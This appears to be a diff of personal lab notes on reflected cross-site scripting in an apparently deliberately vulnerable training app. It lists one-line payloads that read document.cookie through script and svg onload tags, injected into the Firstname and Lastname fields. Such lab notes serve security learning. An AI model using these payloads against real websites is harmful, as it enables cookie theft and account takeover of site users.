@@ -1,8 +1,7 @@
 XSS - Reflected (GET)(LOW)
 Payload- <script>alert(document.cookie)</script>(can be inserted in both parameter Firstname and lastname)
 
-XSS - Reflected (GET)(MEDIUM)
-Payload- <svg onload=alert(document.cookie)>(Can be inserted in both the parameter Firstname and Lastname)
+XSS - Reflected (GET)(MEDIUM) Payload- <svg onload=alert(document.cookie)>(Can be inserted in both the parameter Firstname and Lastname)
 
 XSS - Reflected (GET)(High)
 NYF
